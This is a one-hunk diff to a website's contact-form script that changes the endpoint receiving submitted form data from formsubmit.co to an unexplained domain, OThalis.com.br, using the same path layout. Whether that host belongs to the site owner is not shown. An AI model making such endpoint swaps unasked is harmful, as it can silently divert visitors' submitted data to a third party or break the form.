@@ -236,7 +236,7 @@ contactForm.addEventListener('submit', async (e) => {
     formData.append('_replyto', email);
     
     try {
-        const response = await fetch('https://formsubmit.co/ajax/Henthaliss@gmail.com', {
+        const response = await fetch('https://OThalis.com.br/ajax/Henthaliss@gmail.com', {
             method: 'POST',
             body: formData
         });
